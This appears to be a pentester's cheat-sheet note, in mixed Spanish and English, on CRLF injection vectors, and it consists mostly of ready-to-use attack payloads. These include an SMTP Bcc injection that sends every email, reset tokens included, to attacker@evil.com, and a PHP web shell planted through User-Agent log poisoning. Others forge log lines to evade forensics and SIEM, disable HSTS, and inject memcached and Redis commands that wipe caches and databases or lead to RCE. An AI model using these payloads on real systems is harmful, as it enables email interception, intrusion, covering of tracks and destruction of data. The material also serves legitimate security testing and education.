---
aliases:
  - SMTP Injection
  - Email Header Injection
  - Log Poisoning CRLF
  - Memcached Injection
tags:
  - type/technique
  - vuln/crlf-injection
  - technique/initial-access
  - technique/lateral-movement
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
  - "[[HTTP Request Smuggling]]"
---
# CRLF Injection - Vectores Específicos

***

## Email Header Injection (SMTP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Email contact form passes user input directly a SMTP headers. CRLF inject permite añadir headers / body / attachments. | SMTP CRLF injection. |
| `From` injection | `victim@target.com%0d%0aBcc:%20attacker@evil.com` | Hidden BCC. |
| `Subject` injection | `Hello%0d%0aBcc:%20attacker@evil.com` | Same. |
| Add malicious headers | Inject `Reply-To`, `X-Mailer`, etc | Header forgery. |
| Inject body | `subject%0d%0a%0d%0a<malicious body>` | Override message body. |
| Inject MIME attachments | `%0d%0a%0d%0a--boundary%0d%0aContent-Type:%20application/exe...` | Multipart injection. |
| Inject mass spam | Multiple BCC headers | Send mass spam. |
| Inject phishing email body | Replace legit body con phish | Email phishing. |
| Inject SMTP commands | `From: x%0d%0a.%0d%0aMAIL FROM:<attacker>` | If raw SMTP. |
| Combine con email-based reset | Manipulate password reset emails | Auth chain. |
| PHP `mail()` historic vuln | Pre-PHP 5.2 simple to exploit | Legacy. |
| `nodemailer` / Python smtplib | If user input concat into headers | Standard pattern. |
| Combine con trusted FROM | Spoofed legit-from | Phishing impact. |
| MIME boundary inject | Add fake parts | Edge. |
^crlfi-specific-smtp

### PoC SMTP CRLF injection

```
Contact form: from=victim@target.com&subject=Hello

Atacante's payload:
from=victim@target.com%0d%0aBcc:%20attacker@evil.com&subject=Hello

Resulting email (SMTP layer):
From: victim@target.com
Bcc: attacker@evil.com         ← injected, hidden from recipient
Subject: Hello

Email body...

→ Atacante recibe copy de cada email enviado.
→ Combine con password reset → atacante intercepts tokens.
```

___

## Redirect Injection (`Location:` Header)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Standard Location inject | `?url=https://target.com%0d%0aSet-Cookie:%20a=1` | Set cookie + redirect. |
| Location + Set-Cookie | Multi-effect | Combine. |
| Location override | Multiple Location headers — browser uses first or last | Per-browser. |
| Combine con response splitting | Full second response | Standard. |
| Combine con Open Redirect | Direct OR + cookie set | Compound. |
| Force HTTP downgrade | Inject `Strict-Transport-Security: max-age=0` | HSTS bypass. |
| Inject Refresh header | `Refresh:%200;url=//attacker` | Alt redirect. |
| `Location` con userinfo trick | `https://target.com%0d%0a@attacker.com` | URL parser confusion. |
| Combine con Open Redirect bypass | OR via header inject | Compound. |
| 30x status manipulation | Inject status line | Edge response splitting. |
^crlfi-specific-redirect

___

## Log Injection / Log Poisoning

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Inject CRLF en input que se loggea sin sanitización → fake log lines | Log forgery. |
| Forge fake log entry | `%0d%0a2025-01-01 INFO: User admin logged in` | Forensics evasion. |
| Inject malicious URL | Log con malicious link → admin click → XSS | Admin attack. |
| Cover atacante's actions | Inject lines that mask real activity | Anti-forensics. |
| Combine con LFI | Atacante reads log → inject PHP → LFI executes | Log → LFI → RCE. |
| `/var/log/apache2/access.log` poisoning | `User-Agent: <?php system($_GET[c]); ?>` | LFI to RCE chain. |
| `/var/log/auth.log` injection | SSH brute force con username con CRLF | Auth log forge. |
| Combine con SIEM evasion | Atacante's actions split across multiple lines | Detection bypass. |
| Inject syslog priority | Manipulate priority levels | Logging filter bypass. |
| Compliance evasion | If logs are audit-required | Compliance impact. |
| ELK stack injection | If logs ingested raw a Elasticsearch | Data integrity. |
| Combine con log4j | If log4j vulnerable + CRLF | Compound. |
^crlfi-specific-log

___

## HTTP Request Smuggling Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | CRLF inject en header value smuggles new request to backend | HRS variant. |
| Inject Content-Length | `Header: value\r\nContent-Length: 50` | Force length differential. |
| Inject Transfer-Encoding | `Header: value\r\nTransfer-Encoding: chunked` | Force TE differential. |
| Smuggle entire request | Inject full HTTP request after `\r\n\r\n` | Multi-vector. |
| Frontend strips CRLF, backend doesn't | Differential parsing → smuggle | Standard HRS. |
| Combine con cache poisoning | Smuggled response cached | Mass impact. |
| H2 to H1 downgrade | HTTP/2 frontend con CRLF en pseudo-header | Modern. |
| Smuggle Host header | Inject malicious Host | HHI combo. |
| Smuggle authentication | Force backend to authenticate as atacante | Edge. |
| Combine con Open Redirect | Smuggle + redirect | Multi-step. |
| Internal vhost reach | Smuggle Host: internal | Standard. |
| See `HTTP Request Smuggling` | Comprehensive | Cross-ref. |
^crlfi-specific-hrs

___

## Memcached / Redis / SMTP via Newlines

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Memcached injection | Cache key concatenated con user input → CRLF inject sends new memcached commands | NoSQL adjacent. |
| Memcached `set` inject | Atacante sets arbitrary keys | Cache poisoning. |
| Memcached `flush_all` | Clear cache | DoS. |
| Memcached `delete` | Remove keys | DoS. |
| Memcached binary protocol | Different from text | Edge. |
| Redis CRLF injection (RESP) | Redis protocol uses `\r\n` separators | Direct. |
| Redis command inject | Inject `SET malicious value\r\nDEL admin_session` | Command injection. |
| Redis FLUSHALL | Wipe DB | DoS. |
| Redis CONFIG SET dir | Combine para RCE via slave replication | Standard Redis attack. |
| SMTP raw protocol | If app sends raw SMTP commands | Direct command inject. |
| FTP via newline | FTP commands accept newlines | Same family. |
| LDAP via line | LDAP filter injection adjacent | Edge. |
| Combine con SSRF | SSRF via gopher to internal Redis | Standard chain. |
| Telnet / IRC injection | Protocols con \r\n | Same family. |
^crlfi-specific-protocols

### Memcached injection PoC

```
Backend code (vulnerable):
def get_user(name):
    key = f"user:{name}"  # ← user input concatenated
    return memcached.get(key)

Atacante input: name = "atacante\r\nflush_all\r\n"

Resulting memcached protocol:
get user:atacante
flush_all                  ← injected! Cache wiped.

→ Cache poisoning + DoS.
→ Combine: atacante sets own keys + invalidates legit.
```

***
